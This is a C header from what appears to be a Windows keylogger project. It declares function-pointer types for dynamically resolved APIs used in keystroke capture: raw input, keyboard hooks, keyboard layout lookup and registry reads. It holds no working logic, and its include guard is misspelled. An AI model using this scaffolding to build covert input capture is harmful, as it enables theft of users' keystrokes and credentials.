#ifndef COMMON_COMMON_H
#define COMMMON_COMMON_H

#include <windows.h>
#include <common/Native.h>

#include "Keylogger.h"

typedef PVOID ( NTAPI*fnRtlAllocateHeap )(
    IN PVOID          HeapHandle,
    IN OPTIONAL ULONG Flags,
    IN SIZE_T         Size
);

typedef PVOID ( NTAPI*fnRtlReAllocateHeap )(
    IN PVOID          HeapHandle,
    IN ULONG          Flags,
    IN OPTIONAL PVOID BaseAddress,
    IN SIZE_T         Size
);

typedef PVOID ( NTAPI*fnRtlFreeHeap )(
    IN PVOID          HeapHandle,
    IN OPTIONAL ULONG Flags,
    IN OPTIONAL PVOID BaseAddress
);

typedef BOOL ( WINAPI*fnAttachConsole )(
    IN DWORD dwProcessId
);

typedef HANDLE WINAPI ( WINAPI*fnGetStdHandle )(
    IN DWORD nStdHandle
);

typedef BOOL ( WINAPI*fnWriteConsoleA )(
    IN HANDLE            hConsoleOutput,
    IN const PVOID       lpBuffer,
    IN DWORD             nNumberOfCharsToWrite,
    OUT OPTIONAL LPDWORD lpNumberOfCharsWritten,
    LPVOID               lpReserved
);

typedef int ( WINAPI*fnVsnprintf )(
    char *      buffer,
    size_t      count,
    const char *format,
    va_list     argptr
);

typedef PVOID ( WINAPI*fnLoadLibraryA )(
    PCSTR Module
);

typedef INT ( WINAPI*fnMessageBoxA )(
    IN OPTIONAL HWND   hWnd,
    IN OPTIONAL LPCSTR lpText,
    IN OPTIONAL LPCSTR lpCaption,
    IN UINT            uType
);

typedef UINT ( WINAPI*fnGetRawInputData )(
    IN HRAWINPUT        hRawInput,
    IN UINT             uiCommand,
    OUT OPTIONAL LPVOID pData,
    IN OUT PUINT        pcbSize,
    IN UINT             cbSizeHeader
);

typedef LRESULT ( WINAPI*fnDefWindowProcA )(
    IN HWND   hWnd,
    IN UINT   Msg,
    IN WPARAM wParam,
    IN LPARAM lParam
);

typedef HMODULE ( WINAPI*fnGetModuleHandleA )(
    IN OPTIONAL LPCSTR lpModuleName
);

typedef USHORT ( WINAPI*fnRegisterClassExA )(
    IN const WNDCLASSEXA *unnamedParam1
);

typedef HWND ( WINAPI*fnCreateWindowExA )(
    IN DWORD              dwExStyle,
    IN OPTIONAL LPCSTR    lpClassName,
    IN OPTIONAL LPCSTR    lpWindowName,
    IN DWORD              dwStyle,
    IN int                X,
    IN int                Y,
    IN int                nWidth,
    IN int                nHeight,
    IN OPTIONAL HWND      hWndParent,
    IN OPTIONAL HMENU     hMenu,
    IN OPTIONAL HINSTANCE hInstance,
    IN OPTIONAL LPVOID    lpParam
);

typedef BOOL ( WINAPI*fnRegisterRawInputDevices )(
    IN PCRAWINPUTDEVICE pRawInputDevices,
    IN UINT             uiNumDevices,
    IN UINT             cbSize
);

typedef BOOL ( WINAPI*fnGetMessageA )(
    OUT LPMSG        lpMsg,
    IN OPTIONAL HWND hWnd,
    IN UINT          wMsgFilterMin,
    IN UINT          wMsgFilterMax
);

typedef BOOL ( WINAPI*fnTranslateMessage )(
    IN const MSG *lpMsg
);

typedef LRESULT ( WINAPI*fnDispatchMessage )(
    IN const MSG *lpMsg
);

typedef BOOL ( WINAPI*fnUnregisterClassA )(
    IN LPCSTR             lpClassName,
    IN OPTIONAL HINSTANCE hInstance
);

typedef BOOL ( WINAPI*fnDestroyWindow )(
    IN HWND hWnd
);

typedef LRESULT ( WINAPI*fnCallNextHookEx )(
    IN OPTIONAL HHOOK hhk,
    IN int            nCode,
    IN WPARAM         wParam,
    IN LPARAM         lParam
);

typedef HHOOK ( WINAPI*fnSetWindowsHookExA )(
    IN int       idHook,
    IN HOOKPROC  lpfn,
    IN HINSTANCE hmod,
    IN DWORD     dwThreadId
);

typedef BOOL ( WINAPI*fnUnhookWindowsHookEx )(
    IN HHOOK hhk
);

typedef BOOL ( WINAPI*fnGetKeyboardLayoutNameA )(
    OUT LPSTR pwszKLID
);

typedef HKL ( WINAPI*fnGetKeyboardLayout )(
    IN DWORD idThread
);

typedef LONG ( WINAPI*fnRegQueryValueA )(
    IN HKEY               hKey,
    IN OPTIONAL LPCSTR    lpSubKey,
    OUT OPTIONAL LPSTR    lpData,
    IN OUT OPTIONAL PLONG lpcbData
);

typedef LSTATUS ( WINAPI*fnRegQueryValueExA )(
    IN HKEY                 hKey,
    IN OPTIONAL LPCSTR      lpValueName,
    LPDWORD                 lpReserved,
    OUT OPTIONAL LPDWORD    lpType,
    OUT OPTIONAL LPBYTE     lpData,
    IN OUT OPTIONAL LPDWORD lpcbData
);

typedef LSTATUS ( WINAPI*fnRegOpenKeyExA )(
    IN HKEY            hKey,
    IN OPTIONAL LPCSTR lpSubKey,
    IN DWORD           ulOptions,
    IN REGSAM          samDesired,
    OUT PHKEY          phkResult
);

typedef int ( WINAPI*fnLCIDToLocaleName )(
    IN LCID             Locale,
    OUT OPTIONAL LPWSTR lpName,
    IN int              cchName,
    IN DWORD            dwFlags
);

typedef PKBDTABLES ( WINAPI*fnKbdLayerDescriptor )();

typedef LONG ( WINAPI*fnRegCloseKey )(
    IN HKEY hKey
);

#endif //COMMON_COMMON_H
